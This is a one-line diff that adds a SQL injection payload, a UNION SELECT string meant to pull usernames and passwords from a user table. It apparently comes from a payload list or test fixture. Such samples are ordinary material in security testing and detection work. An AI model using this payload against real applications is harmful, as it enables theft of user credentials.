@@ -1,0 +1,1 @@
+1 union all select username,password from user where id=1
